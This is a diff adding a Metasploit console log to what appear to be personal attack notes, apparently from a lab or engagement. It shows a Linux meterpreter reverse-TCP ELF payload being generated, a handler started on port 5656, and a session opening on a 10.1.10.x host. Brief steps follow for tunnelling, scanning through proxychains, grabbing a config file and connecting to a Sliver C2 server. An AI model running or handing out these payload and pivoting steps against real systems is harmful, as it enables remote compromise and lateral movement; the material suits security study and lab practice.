@@ -287,5 +287,39 @@ Description:
 
 
 View the full module info with the info -d command.
+
+msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev
+[*] Writing 250 bytes to rev...
+msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p inux/x64/meterpreter/reverse_tcp -h 0.0.0.0 -P 5656
+[-] Invalid Payload Name Supplied!
+msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -h 0.0.0.0 -P 5656
+Usage: handler [options]
+
+Spin up a Payload Handler as background job.
+
+OPTIONS:
+
+    -e   An Encoder to use for Payload Stage Encoding
+    -h   Help Banner
+    -H   The RHOST/LHOST to configure the handler for
+    -n   The custom name to give the handler job
+    -p   The payload to configure the handler for
+    -P   The RPORT/LPORT to configure the handler for
+    -x   Shut the Handler down after a session is established
+msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 5656
+[*] Payload handler running as background job 0.
+
+[*] Started reverse TCP handler on 0.0.0.0:5656 
+msf payload(linux/x64/meterpreter/reverse_tcp) > [*] Sending stage (3090404 bytes) to 10.1.10.196
+[*] Meterpreter session 1 opened (10.1.10.56:5656 -> 10.1.10.196:37440) at 2026-06-08 14:16:46 -0400
+
 ```
+
+Make Tunnels
+proxychains nmap
+grab the config file
+setup and connect to the sliver server via proxychains
+
+
+---
 
